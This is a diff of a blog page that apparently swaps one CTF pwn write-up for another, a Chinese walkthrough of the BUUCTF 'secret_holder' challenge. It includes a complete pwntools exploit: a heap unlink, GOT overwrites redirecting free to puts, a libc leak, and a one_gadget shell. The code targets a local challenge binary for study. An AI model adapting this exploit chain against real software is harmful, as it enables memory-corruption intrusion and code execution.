+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27; * 8</span><br><span class="line">payload += p64(elf.got[&#x27;free&#x27;]) # *big_ptr = free@got.plt</span><br><span class="line">payload += b&#x27;a&#x27; * 8</span><br><span class="line">payload += p64(big_ptr)         # *small_ptr = big_ptr</span><br><span class="line">renew(1, payload)</span><br><span class="line">renew(2, p64(elf.plt[&#x27;puts&#x27;]))  # *free@got.plt = puts@plt</span><br><span class="line">renew(1, p64(elf.got[&#x27;puts&#x27;]))  # *big_ptr = puts@got.plt</span><br><span class="line"></span><br><span class="line">wipe(2)                         # puts(puts@got.plt)</span><br><span class="line">puts_addr = u64(io.recvline()[:6].ljust(8, b&#x27;\0&#x27;))</span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
+<p><strong>第一次 <code>renew(1)</code> (在 Step 1):</strong></p>
 <ul>
-<li>注意这里shellcode的地址，可以根据前面的栈结构图来求得，<code>0x50 = 0x30(name) + 0x8(rbp) + 0x8(rip) + 0x10(main栈帧)</code></li>
-<li>0x90&#x3D;0x0+ dest +rbp + rip +sub_400A8E-main‘s rbp的大小，</li>
-<li>这个id的size没有太严格要求，只需要大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于 <code>av-&gt;system_mem</code></li>
-<li>这里选取p64(0x41)是因为这样能够使ID正好相当于我们伪造chunk的nextchunk的size</li>
-<li>这里前面用p64(0)有好处，就是能够使 <code>sub_400A29</code>中的 <code>strcpy(dest, &amp;buf);</code>不起作用。</li>
+<li><strong>目的</strong> ：把 <code>big_ptr</code> 指向 <code>free@got</code>。</li>
+<li><strong>后续动作</strong> ：利用 <code>renew(2)</code> 向 <code>big_ptr</code> 指向的地址写入数据。</li>
+<li><strong>结果</strong> ：将 <code>free@got</code> 里的内容（原本是 <code>free</code> 的地址）覆盖为了 <code>puts@plt</code>。</li>
+<li><strong>本质</strong> ：这是为了 <strong>劫持控制流</strong> （把 <code>free</code> 变成 <code>puts</code>）。</li>
 </ul>
-<p>我们这里fake_addr主要是覆盖了dest，并且由于dest&#x3D;&#x3D; ptr，因此ptr也就指向了fake_addr上一行，当我们释放ptr的时候，就把0x41大小的块进行了释放进入fastbin</p>
-<p>再次申请后，我们可以对下面的rip进行修改，改成shellcode的地址&#x3D;24 &#x3D; 0x0+fake_addr+ rbp &#x3D; 3*8</p>
+<p><strong>第二次 <code>renew(1)</code></strong></p>
+<ul>
+<li><strong>目的</strong> ：把 <code>big_ptr</code> 指向 <code>puts@got</code>。</li>
+<li><strong>后续动作</strong> ：利用 <code>wipe(2)</code> 触发函数调用。</li>
+<li><strong>结果</strong> ：执行 <code>puts(big_ptr指向的内容)</code>。</li>
+<li><strong>本质</strong> ：这是为了 <strong>传递参数</strong> ，以便泄露信息。</li>
+</ul>
+<p><strong>此时的状态：</strong></p>
+<ul>
+<li><strong>函数</strong> ：因为劫持成功，<code>wipe(2)</code> 实际上调用的是 <code>puts(...)</code>。</li>
+<li><strong>参数</strong> ：<code>puts</code> 的参数是 <code>big_ptr</code> 指向的地址。</li>
+<li><strong>问题来了</strong> ：此时 <code>big_ptr</code> 指向哪里？</li>
+<li>指向  <strong><code>puts@got</code></strong> 。因此会打印出puts的地址内存地址，由此我们可以进一步计算出libc地址</li>
+</ul>
+<p>最后利用one_gadge修改地址</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc_base +0x4368e</span><br><span class="line">payload = b&#x27;a&#x27; * 0x10</span><br><span class="line">payload += p64(elf.got[&#x27;puts&#x27;]) # *small_ptr = puts@got.plt</span><br><span class="line">renew(1, payload)</span><br><span class="line">renew(1, p64(one_gadget))       # puts@got.plt = one_gadget</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">#这里small还是指向big的，因此在执行renew后，small指向了puts的got，然后第二次执行，将修改puts的got的内容为one_gadge的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>完整exp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">io = process(&#x27;./SecretHolder_patch&#x27;)</span><br><span class="line">libc = ELF(&#x27;/opt/glibc-2.23/lib/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;./SecretHolder_patch&#x27;)</span><br><span class="line">def keep(idx):</span><br><span class="line">    io.sendlineafter(b&#x27;Renew secret\n&#x27;, b&#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;Huge secret\n&#x27;, str(idx))</span><br><span class="line">    io.sendafter(b&#x27;secret: \n&#x27;, b&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">def wipe(idx):</span><br><span class="line">    io.sendlineafter(b&#x27;Renew secret\n&#x27;, b&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;Huge secret\n&#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def renew(idx, data):</span><br><span class="line">    io.sendlineafter(b&#x27;Renew secret\n&#x27;, b&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(b&#x27;Huge secret\n&#x27;, str(idx))</span><br><span class="line">    io.sendafter(b&#x27;secret: \n&#x27;, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  </span><br><span class="line">  gdb.attach(io)</span><br><span class="line">  log.info(&quot;start&quot;)</span><br><span class="line"> # pause()</span><br><span class="line">  keep(1)</span><br><span class="line">  wipe(1)</span><br><span class="line">  log.info(&quot;wipe1&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  keep(2)</span><br><span class="line">  log.info(&quot;keep2&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  wipe(1)</span><br><span class="line">  log.info(&quot;double free 1&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  keep(1)</span><br><span class="line">  log.info(&quot;uaf1&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  keep(3)</span><br><span class="line">  log.info(&quot;keep3&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  wipe(3)</span><br><span class="line">  log.info(&quot;wipe3&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  keep(3)</span><br><span class="line">  log.info(&quot;keep3 again&quot;)</span><br><span class="line">  #pause()</span><br><span class="line">  </span><br><span class="line">  small_ptr = 0x6020b0 # ida静态分析获取</span><br><span class="line">  big_ptr = 0x6020a0   # 同上</span><br><span class="line"></span><br><span class="line">  payload = p64(0)</span><br><span class="line">  payload += p64(0x21)             # fake size</span><br><span class="line">  payload += p64(small_ptr - 0x18) # 绕过FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</span><br><span class="line">  payload += p64(small_ptr - 0x10) # 同上</span><br><span class="line">  payload += p64(0x20)             # huge.pre_size, 绕过chunksize(P) != prev_size (next_chunk(P))</span><br><span class="line">  payload += p64(0x61a90)          # huge.size</span><br><span class="line">  renew(2, payload)                # 构造fake chunk</span><br><span class="line">  wipe(3)</span><br><span class="line">  log.info(&quot;wipe3 now &quot;)                          # 触发unlink</span><br><span class="line">  payload2 = b&#x27;a&#x27; * 8</span><br><span class="line">  payload2 += p64(elf.got[&#x27;free&#x27;]) # *big_ptr = free@got.plt</span><br><span class="line">  payload2 += b&#x27;a&#x27; * 8</span><br><span class="line">  payload2 += p64(big_ptr)         # *small_ptr = big_ptr</span><br><span class="line">  renew(1, payload2)</span><br><span class="line">  renew(2, p64(elf.plt[&#x27;puts&#x27;]))  # *free@got.plt = puts@plt</span><br><span class="line">  renew(1, p64(elf.got[&#x27;puts&#x27;]))  # *big_ptr = puts@got.plt</span><br><span class="line"></span><br><span class="line">  wipe(2)                         # puts(puts@got.plt)</span><br><span class="line">  puts_addr = u64(io.recvline()[:6].ljust(8, b&#x27;\0&#x27;))</span><br><span class="line">  libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">  print(hex(libc_base))</span><br><span class="line">  pause()</span><br><span class="line"></span><br><span class="line">  one_gadget = libc_base + 0x4368e</span><br><span class="line">  payload3 = b&#x27;a&#x27; * 0x10</span><br><span class="line">  payload3 += p64(elf.got[&#x27;puts&#x27;]) # *small_ptr = puts@got.plt</span><br><span class="line">  renew(1, payload3)</span><br><span class="line">  renew(1, p64(one_gadget))       # puts@got.plt = one_gadget</span><br><span class="line">  io.interactive()</span><br></pre></td></tr></table></figure></div>
 
 		</div>
 
@@ -528,18 +560,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> lctf2016-pwn200</li>
+        <li><strong>Title:</strong> BUUCTF-secret_holder</li>
         <li><strong>Author:</strong> A1ex</li>
         <li><strong>Created at
-                :</strong> 2025-12-15 19:32:34</li>
+                :</strong> 2025-12-17 19:19:05</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-12-15 21:26:40
+                    :</strong> 2025-12-17 20:02:15
             </li>
         
         <li>
-            <strong>Link:</strong> https://havenoideal123.github.io/2025/12/15/lctf2016-pwn200/
+            <strong>Link:</strong> https://havenoideal123.github.io/2025/12/17/BUUCTF-secret-holder/
         </li>
         <li>
             <strong>
@@ -573,12 +605,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/12/17/BUUCTF-secret-holder/">
+				<a class="prev" rel="prev" href="/2025/12/17/sleeply-holder/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">BUUCTF-secret_holder</span>
+						<span class="post-nav-title-item truncate max-w-48">sleeply-holder</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
@@ -586,9 +618,9 @@
 			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/12/09/babyheap/">
+				<a class="next" rel="next" href="/2025/12/15/lctf2016-pwn200/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">babyheap</span>
+						<span class="post-nav-title-item truncate max-w-48">lctf2016-pwn200</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -663,8 +695,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">lctf2016-pwn200</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lctf2016-pwn200"><span class="nav-text">Lctf2016-pwn200</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">利用场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">利用思路</span></a></li></ol></li></ol>
+		<div class="page-title">BUUCTF-secret_holder</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WP"><span class="nav-text">WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink"><span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-text">题解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="nav-text">总体思路</span></a></li></ol></li></ol>
 
 	</div>
 </div>
